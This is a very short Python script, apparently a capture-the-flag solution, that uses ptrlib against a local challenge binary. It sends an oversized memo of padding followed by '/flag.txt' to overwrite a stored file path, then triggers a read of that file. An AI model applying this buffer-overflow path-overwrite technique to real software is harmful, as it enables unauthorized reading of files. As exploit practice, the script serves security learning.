from ptrlib import *

sock = Process("./chall")

sock.sendlineafter("> ", "1")
sock.sendlineafter("Memo: ", "A"*0xff0 + "/flag.txt\0")

sock.sendlineafter("> ", "2")

sock.sh()
